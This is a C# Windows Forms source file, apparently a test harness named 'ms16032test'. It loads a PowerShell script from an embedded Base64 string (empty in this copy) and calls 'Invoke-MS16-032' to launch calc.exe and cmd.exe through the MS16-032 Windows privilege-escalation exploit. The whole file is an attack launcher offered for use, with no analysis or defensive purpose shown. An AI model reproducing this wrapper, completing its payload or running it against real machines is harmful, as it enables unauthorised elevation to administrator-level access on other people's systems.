using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;

namespace ms16032test
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        static string _application;
        static string _commandline;

        private void button1_Click(object sender, EventArgs e)
        {
            _application = "calc.exe";
            _commandline = "cmd.exe";
            PowerShellExecutor t = new PowerShellExecutor();
            t.ExecuteSynchronously(_application, _commandline);
        }
    }


    class PowerShellExecutor
    {
        public static string PSInvoke_MS16_032 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        public void ExecuteSynchronously(string aplication, string commandline)
        {
            string Commandout;
            InitialSessionState iss = InitialSessionState.CreateDefault();
            Runspace rs = RunspaceFactory.CreateRunspace(iss);
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(PSInvoke_MS16_032);
            if (commandline != "")
            {
                Commandout = "Invoke-MS16-032 -Application \"" + aplication + "\" -Commandline " + "\"" + commandline + "\"";
            }
            else
            {
                Commandout = "Invoke-MS16-032 -Application " + aplication;
            }
            MessageBox.Show(Commandout);
            ps.AddScript(Commandout);
            ps.AddCommand("Out-Default");
            ps.Invoke();
            rs.Close();
        }
    }
}
